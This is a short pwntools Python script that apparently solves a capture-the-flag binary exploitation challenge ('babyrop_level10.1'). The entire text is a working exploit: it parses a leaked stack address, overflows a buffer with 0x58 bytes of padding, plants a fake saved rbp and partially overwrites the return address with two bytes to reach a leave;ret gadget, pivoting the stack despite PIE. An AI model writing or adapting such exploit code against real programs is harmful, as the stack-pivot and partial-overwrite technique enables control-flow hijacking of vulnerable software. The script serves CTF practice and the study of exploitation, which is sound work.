# idea: PIE enabled, with stack addr leak -> 12 bits gadgets with bruteforcing highest 4 bit
from pwn import *

p = process("/challenge/babyrop_level10.1")

leave_ret = 0x1f3d
p.recvuntil("located at: ")
leak = int(p.recvuntil(".")[:-1], 16)
fake_rbp = leak - 0x8 - 0x8 # the addr 8 byte above what we truly what to return to

padding = b"A" * 0x58 # right before fake rbp

payload = padding + p64(fake_rbp) + p16(leave_ret)
p.send(payload)
print(p.recvall())
p.close()

